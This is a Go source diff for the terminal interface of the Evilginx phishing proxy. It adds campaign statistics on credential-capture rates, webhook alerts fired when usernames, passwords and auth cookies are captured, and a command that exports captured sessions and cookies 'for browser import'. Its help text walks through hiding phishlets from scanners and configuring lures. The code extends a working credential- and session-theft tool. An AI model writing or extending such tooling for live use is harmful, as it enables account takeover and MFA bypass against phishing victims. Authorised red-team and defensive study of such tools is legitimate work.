@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"math/rand"
 	"net/url"
 	"os"
@@ -28,9 +27,15 @@ import (
 )
 
 const (
-	DEFAULT_PROMPT = ": "
-	LAYER_TOP      = 1
+	LAYER_TOP = 1
 )
+
+// Matrix-styled prompt
+var promptColor = color.New(color.FgHiGreen, color.Bold)
+
+func getMatrixPrompt() string {
+	return promptColor.Sprint("evilginx") + color.HiCyanString("> ")
+}
 
 type Terminal struct {
 	rl        *readline.Instance
@@ -41,6 +46,9 @@ type Terminal struct {
 	db        *database.Database
 	hlp       *Help
 	developer bool
+	done      chan struct{}
+	stats     *Stats
+	exporter  *Exporter
 }
 
 func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Database, developer bool) (*Terminal, error) {
@@ -51,13 +59,16 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 		p:         p,
 		db:        db,
 		developer: developer,
+		done:      make(chan struct{}),
+		stats:     NewStats(db),
+		exporter:  NewExporter(db),
 	}
 
 	t.createHelp()
 	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)
 
 	t.rl, err = readline.NewEx(&readline.Config{
-		Prompt:              DEFAULT_PROMPT,
+		Prompt:              getMatrixPrompt(),
 		AutoComplete:        t.completer,
 		InterruptPrompt:     "^C",
 		EOFPrompt:           "exit",
@@ -70,6 +81,7 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 }
 
 func (t *Terminal) Close() {
+	close(t.done)
 	t.rl.Close()
 }
 
@@ -79,6 +91,7 @@ func (t *Terminal) output(s string, args ...interface{}) {
 }
 
 func (t *Terminal) DoWork() {
+	defer t.Close()
 	var do_quit = false
 
 	t.checkStatus()
@@ -152,6 +165,18 @@ func (t *Terminal) DoWork() {
 			err := t.handleBlacklist(args[1:])
 			if err != nil {
 				log.Error("blacklist: %v", err)
+			}
+		case "stats":
+			cmd_ok = true
+			err := t.handleStats(args[1:])
+			if err != nil {
+				log.Error("stats: %v", err)
+			}
+		case "webhook":
+			cmd_ok = true
+			err := t.handleWebhook(args[1:])
+			if err != nil {
+				log.Error("webhook: %v", err)
 			}
 		case "test-certs":
 			cmd_ok = true
@@ -311,6 +336,82 @@ func (t *Terminal) handleBlacklist(args []string) error {
 				return nil
 			}
 		}
+	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleWebhook(args []string) error {
+	webhook := t.p.GetWebhook()
+	pn := len(args)
+
+	if pn == 0 {
+		// Show webhook status
+		status := "disabled"
+		if webhook.IsEnabled() {
+			status = "enabled"
+		}
+		keys := []string{"status", "url", "secret"}
+		vals := []string{status, webhook.GetURL(), webhook.GetSecret()}
+		log.Printf("\n%s\n", AsRows(keys, vals))
+		return nil
+	}
+
+	switch args[0] {
+	case "url":
+		if pn < 2 {
+			return fmt.Errorf("usage: webhook url <url>")
+		}
+		webhook.SetURL(args[1])
+		log.Success("webhook url set to: %s", args[1])
+		return nil
+	case "secret":
+		if pn < 2 {
+			return fmt.Errorf("usage: webhook secret <secret>")
+		}
+		webhook.SetSecret(args[1])
+		log.Success("webhook secret set")
+		return nil
+	case "enable":
+		webhook.Enable()
+		log.Success("webhook notifications enabled")
+		return nil
+	case "disable":
+		webhook.Disable()
+		log.Success("webhook notifications disabled")
+		return nil
+	case "test":
+		if err := webhook.Test(); err != nil {
+			return fmt.Errorf("webhook test failed: %v", err)
+		}
+		log.Success("webhook test successful")
+		return nil
+	}
+
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleStats(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		// Show overall stats
+		out, err := t.stats.GetOverview()
+		if err != nil {
+			return err
+		}
+		log.Printf("%s", out)
+		return nil
+	} else if pn == 1 {
+		// Show stats for specific phishlet
+		phishlet := args[0]
+		if _, err := t.cfg.GetPhishlet(phishlet); err != nil {
+			return fmt.Errorf("phishlet not found: %s", phishlet)
+		}
+		out, err := t.stats.GetPhishletStats(phishlet)
+		if err != nil {
+			return err
+		}
+		log.Printf("%s", out)
+		return nil
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
 }
@@ -555,6 +656,57 @@ func (t *Terminal) handleSessions(args []string) error {
 				t.db.Flush()
 				return nil
 			}
+		}
+	} else if pn >= 2 && args[0] == "export" {
+		// sessions export <format> [--file <path>]
+		format := args[1]
+		var filePath string
+		var sessionID int = -1
+
+		// Parse optional arguments
+		for i := 2; i < pn; i++ {
+			if args[i] == "--file" && i+1 < pn {
+				filePath = args[i+1]
+				i++
+			} else if args[i] == "--id" && i+1 < pn {
+				var err error
+				sessionID, err = strconv.Atoi(args[i+1])
+				if err != nil {
+					return fmt.Errorf("invalid session ID: %s", args[i+1])
+				}
+				i++
+			}
+		}
+
+		switch format {
+		case "json":
+			if filePath == "" {
+				filePath = GetDefaultExportPath("json")
+			}
+			var ids []int
+			if sessionID >= 0 {
+				ids = []int{sessionID}
+			}
+			return t.exporter.ExportToJSON(filePath, ids)
+		case "csv":
+			if filePath == "" {
+				filePath = GetDefaultExportPath("csv")
+			}
+			var ids []int
+			if sessionID >= 0 {
+				ids = []int{sessionID}
+			}
+			return t.exporter.ExportToCSV(filePath, ids)
+		case "cookies":
+			if sessionID < 0 {
+				return fmt.Errorf("usage: sessions export cookies --id <session_id> [--file <path>]")
+			}
+			if filePath == "" {
+				filePath = GetDefaultExportPath("json")
+			}
+			return t.exporter.ExportCookies(filePath, sessionID)
+		default:
+			return fmt.Errorf("unknown export format: %s (use json, csv, or cookies)", format)
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -1135,32 +1287,46 @@ func (t *Terminal) monitorLurePause() {
 	var pausedLures map[string]int64
 	pausedLures = make(map[string]int64)
 
-	for {
-		t_cur := time.Now()
+	ticker := time.NewTicker(500 * time.Millisecond)
+	defer ticker.Stop()
 
-		for n, l := range t.cfg.lures {
-			if l.PausedUntil > 0 {
-				l_id := t.cfg.lureIds[n]
-				t_pause := time.Unix(l.PausedUntil, 0)
-				if t_pause.After(t_cur) {
-					pausedLures[l_id] = l.PausedUntil
-				} else {
-					if _, ok := pausedLures[l_id]; ok {
-						log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
+	for {
+		select {
+		case <-t.done:
+			return
+		case <-ticker.C:
+			t_cur := time.Now()
+
+			for n, l := range t.cfg.lures {
+				if l.PausedUntil > 0 {
+					l_id := t.cfg.lureIds[n]
+					t_pause := time.Unix(l.PausedUntil, 0)
+					if t_pause.After(t_cur) {
+						pausedLures[l_id] = l.PausedUntil
+					} else {
+						if _, ok := pausedLures[l_id]; ok {
+							log.Info("[%s] lure (%d) is now active", l.Phishlet, n)
+						}
+						pausedLures[l_id] = 0
+						l.PausedUntil = 0
 					}
-					pausedLures[l_id] = 0
-					l.PausedUntil = 0
 				}
 			}
 		}
-
-		time.Sleep(500 * time.Millisecond)
 	}
 }
 
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
-	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
+	h.AddCommand("config", "general", "manage general configuration", `Shows values of all configuration variables and allows to change them.
+
+EXAMPLES:
+  config                          Show all settings
+  config domain example.com       Set the base domain
+  config ipv4 external 1.2.3.4    Set external IP
+  config autocert on              Enable Let's Encrypt
+
+TIP: Always configure domain and ipv4 before enabling phishlets.`, LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test"))))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
@@ -1186,7 +1352,18 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
 	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")
 
-	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
+	h.AddCommand("phishlets", "general", "manage phishlets configuration", `Shows status of all available phishlets and allows to change their parameters and enabled status.
+
+EXAMPLES:
+  phishlets                       List all phishlets with status
+  phishlets example               Show details of 'example' phishlet
+  phishlets enable example        Enable the 'example' phishlet
+  phishlets hostname example login.example.com
+                                  Set custom hostname
+  phishlets hide example          Hide from scanners
+  phishlets get-hosts example     Generate /etc/hosts entries
+
+TIP: Use 'phishlets get-hosts' for local testing with /etc/hosts.`, LAYER_TOP,
 		readline.PcItem("phishlets", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("delete", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
@@ -1204,17 +1381,92 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 
-	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
-		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
+	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", `Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.
+
+EXAMPLES:
+  sessions                        List all captured sessions
+  sessions 1                      Show details of session #1
+  sessions delete 1               Delete session #1
+  sessions delete 1-5,8,10-12     Delete sessions in ranges
+  sessions delete all             Delete all sessions
+  sessions export json            Export all sessions to JSON
+  sessions export csv --file out.csv
+                                  Export to specific file
+  sessions export cookies --id 1  Export cookies for session #1
+
+TIP: Use 'sessions export cookies' to export session cookies for browser import.`, LAYER_TOP,
+		readline.PcItem("sessions", readline.PcItemDynamic(t.sessionsIdPrefixCompleter),
+			readline.PcItem("delete", readline.PcItemDynamic(t.sessionsIdPrefixCompleter), readline.PcItem("all")),
+			readline.PcItem("export", readline.PcItem("json"), readline.PcItem("csv"), readline.PcItem("cookies"))))
 	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
 	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
+	h.AddSubCommand("sessions", []string{"export"}, "export <json|csv|cookies> [--file <path>] [--id <id>]", "export sessions to file")
+	h.AddSubCommand("sessions", []string{"export", "json"}, "export json [--file <path>]", "export all sessions to JSON format")
+	h.AddSubCommand("sessions", []string{"export", "csv"}, "export csv [--file <path>]", "export all sessions to CSV format")
+	h.AddSubCommand("sessions", []string{"export", "cookies"}, "export cookies --id <id> [--file <path>]", "export session cookies for browser import")
 
-	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
-		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
+	h.AddCommand("stats", "general", "view campaign statistics", `Displays campaign statistics including session counts, success rates, and activity patterns.
+
+EXAMPLES:
+  stats                           Show overall campaign statistics
+  stats example                   Show stats for 'example' phishlet
+
+METRICS DISPLAYED:
+  - Total sessions and unique IPs
+  - Credential capture success rate
+  - Hourly activity distribution
+  - Per-phishlet breakdown
+  - Top user agents`, LAYER_TOP,
+		readline.PcItem("stats", readline.PcItemDynamic(t.phishletPrefixCompleter)))
+	h.AddSubCommand("stats", nil, "", "show overall campaign statistics")
+	h.AddSubCommand("stats", nil, "<phishlet>", "show statistics for a specific phishlet")
+
+	h.AddCommand("webhook", "general", "configure webhook notifications", `Configure webhook notifications for real-time alerts when credentials are captured.
+
+EXAMPLES:
+  webhook                         Show webhook configuration
+  webhook url https://example.com/hook
+                                  Set webhook URL
+  webhook secret mysecretkey      Set HMAC signing secret
+  webhook enable                  Enable notifications
+  webhook disable                 Disable notifications
+  webhook test                    Send test notification
+
+EVENTS:
+  - session_created: New visitor session
+  - credential_captured: Username/password captured
+  - tokens_captured: Auth cookies captured
+  - session_complete: Full capture complete`, LAYER_TOP,
+		readline.PcItem("webhook", readline.PcItem("url"), readline.PcItem("secret"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("test")))
+	h.AddSubCommand("webhook", nil, "", "show webhook configuration")
+	h.AddSubCommand("webhook", []string{"url"}, "url <url>", "set webhook endpoint URL")
+	h.AddSubCommand("webhook", []string{"secret"}, "secret <secret>", "set HMAC signing secret for request verification")
+	h.AddSubCommand("webhook", []string{"enable"}, "enable", "enable webhook notifications")
+	h.AddSubCommand("webhook", []string{"disable"}, "disable", "disable webhook notifications")
+	h.AddSubCommand("webhook", []string{"test"}, "test", "send test notification to verify configuration")
+
+	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", `Shows all created lures and allows to edit or delete them.
+
+EXAMPLES:
+  lures                           List all lures
+  lures create example            Create lure for 'example' phishlet
+  lures get-url 0                 Generate URL for lure #0
+  lures edit 0 redirect_url https://google.com
+                                  Set redirect after capture
+  lures edit 0 path /login        Custom URL path
+  lures pause 0 1h30m             Pause lure for 1.5 hours
+  lures delete 0                  Delete lure #0
+
+TIP: Use 'lures get-url' with import/export for bulk URL generation.`, LAYER_TOP,
+		readline.PcItem("lures", readline.PcItemDynamic(t.luresIdPrefixCompleter),
+			readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("get-url", readline.PcItemDynamic(t.luresIdPrefixCompleter)),
+			readline.PcItem("pause", readline.PcItemDynamic(t.luresIdPrefixCompleter)),
+			readline.PcItem("unpause", readline.PcItemDynamic(t.luresIdPrefixCompleter)),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
-			readline.PcItem("delete", readline.PcItem("all"))))
+			readline.PcItem("delete", readline.PcItemDynamic(t.luresIdPrefixCompleter), readline.PcItem("all"))))
 
 	h.AddSubCommand("lures", nil, "", "show all create lures")
 	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
@@ -1474,7 +1726,7 @@ func (t *Terminal) phishletPrefixCompleter(args string) []string {
 func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
 	dir := t.cfg.GetRedirectorsDir()
 
-	files, err := ioutil.ReadDir(dir)
+	files, err := os.ReadDir(dir)
 	if err != nil {
 		return []string{}
 	}
@@ -1507,6 +1759,24 @@ func (t *Terminal) luresIdPrefixCompleter(args string) []string {
 		ret = append(ret, strconv.Itoa(n))
 	}
 	return ret
+}
+
+// Dynamic completer for session IDs
+func (t *Terminal) sessionsIdPrefixCompleter(args string) []string {
+	var ret []string
+	sessions, err := t.db.ListSessions()
+	if err != nil {
+		return ret
+	}
+	for _, s := range sessions {
+		ret = append(ret, strconv.Itoa(s.Id))
+	}
+	return ret
+}
+
+// Dynamic completer for config options
+func (t *Terminal) configPrefixCompleter(args string) []string {
+	return []string{"domain", "ipv4", "unauth_url", "autocert", "gophish"}
 }
 
 func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
@@ -1601,7 +1871,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 			return ret, ret_params, err
 		}
 	case "json":
-		data, err := ioutil.ReadAll(bufio.NewReader(f))
+		data, err := io.ReadAll(bufio.NewReader(f))
 		if err != nil {
 			return ret, ret_params, err
 		}
